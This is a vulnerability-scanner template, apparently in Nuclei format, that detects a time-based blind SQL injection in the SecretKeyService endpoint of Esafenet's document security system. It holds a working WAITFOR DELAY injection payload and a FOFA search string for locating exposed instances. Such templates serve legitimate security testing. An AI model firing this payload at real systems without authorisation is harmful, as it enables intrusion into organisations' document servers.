id: poc-yaml-yisaitong-esafenet-secretkeyservice-sqli
info:
  name: 亿赛通电子文档安全管理系统 SecretKeyService SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    finger: 亿赛通电子文档安全管理系统
    fofa: app="亿赛通-电子文档安全管理系统"

variables:
  t1: '{{rand_int(5,10)}}'
  t2: '{{to_number(t1)+2}}'
  t3: '{{url_encode("电子文档安全管理系统")}}'

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - '{{t3}}'

  - raw:
      - |
        GET /CDGServer3/SecretKeyService?command=sameKeyName&keyName=1'+WAITFOR+DELAY+'0:0:{{t1}}'--+ HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "0"
      - type: dsl
        dsl:
          - 'duration > to_number(t1)'
          - 'duration < to_number(t2)'
